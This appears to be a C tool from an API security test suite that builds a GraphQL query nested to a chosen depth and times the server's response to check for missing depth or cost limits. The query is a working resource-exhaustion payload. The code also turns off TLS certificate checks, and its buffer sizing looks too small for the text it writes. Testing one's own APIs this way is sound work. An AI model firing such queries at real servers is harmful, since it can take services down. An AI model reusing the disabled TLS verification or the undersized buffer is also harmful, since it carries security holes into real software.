/*
 * graphql_depth_bomb.c -- API4:2023 Unrestricted Resource Consumption
 * (consulta anidada / circular que agota CPU y memoria)
 *
 * Construye dinamicamente una query con N niveles de anidacion sobre un
 * campo que se repite a si mismo en el esquema (tipico: subasta -> lider
 * -> subastas -> lider -> ... si el esquema expone relaciones circulares).
 * Mide el tiempo de respuesta: si crece exponencialmente con la
 * profundidad (o el proceso del servidor se cae / se cuelga), la API
 * no tiene limite de profundidad/costo.
 *
 * En modo blindado: el servidor debe rechazar la query (ej. error
 * "query too deep") en milisegundos, sin importar la profundidad pedida.
 *
 * Uso:
 *   ./graphql_depth_bomb <url_graphql> <campo_raiz> <campo_anidado> <profundidad>
 *
 * Ejemplo (si el esquema tiene subasta { lider { subastas { lider { ... } } } }):
 *   ./graphql_depth_bomb http://localhost:4000/graphql subasta lider.subastas 500
 *
 * <campo_anidado> puede llevar un punto si cada nivel repite mas de un
 * campo (aqui se repite tal cual, nivel tras nivel).
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "common.h"

int main(int argc, char **argv) {
    if (argc != 5) {
        fprintf(stderr,
            "Uso: %s <url_graphql> <campo_raiz> <campo_anidado> <profundidad>\n",
            argv[0]);
        return 1;
    }
    const char *url = argv[1];
    const char *raiz = argv[2];
    const char *anidado = argv[3];
    int profundidad = atoi(argv[4]);

    /* construye "{ raiz { anidado { anidado { ... id } ... } } }" */
    size_t cap = 64 + (size_t)profundidad * (strlen(anidado) + 4);
    char *query = malloc(cap);
    char *p = query;
    p += sprintf(p, "{ \"query\": \"{ %s { ", raiz);
    for (int i = 0; i < profundidad; i++) p += sprintf(p, "%s { ", anidado);
    p += sprintf(p, "id ");
    for (int i = 0; i < profundidad; i++) p += sprintf(p, "} ");
    p += sprintf(p, "} }\" }");

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
if (curl) {
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
}
    buffer_t buf; buffer_init(&buf);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, query);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, buffer_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L); /* si no hay limite, puede tardar mucho */

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    CURLcode res = curl_easy_perform(curl);
    clock_gettime(CLOCK_MONOTONIC, &t1);

    double ms = (t1.tv_sec - t0.tv_sec) * 1000.0 + (t1.tv_nsec - t0.tv_nsec) / 1e6;
    long status = 0;
    if (res == CURLE_OK) curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

    char detalle[160];
    if (res != CURLE_OK)
        snprintf(detalle, sizeof(detalle), "curl error=%d (posible timeout/caida)", res);
    else
        snprintf(detalle, sizeof(detalle), "tiempo=%.1fms", ms);

    int rechazada_rapido = (res == CURLE_OK && ms < 200 &&
                             (status >= 400 || (buf.data && strstr(buf.data, "\"errors\""))));
    const char *resultado = rechazada_rapido ? "bloqueado" : "VULNERABLE";

    log_result("DepthBomb/API4", url, status, resultado, detalle);
    printf("profundidad pedida=%d, %s\n", profundidad, detalle);

    curl_slist_free_all(headers);
    buffer_free(&buf);
    free(query);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
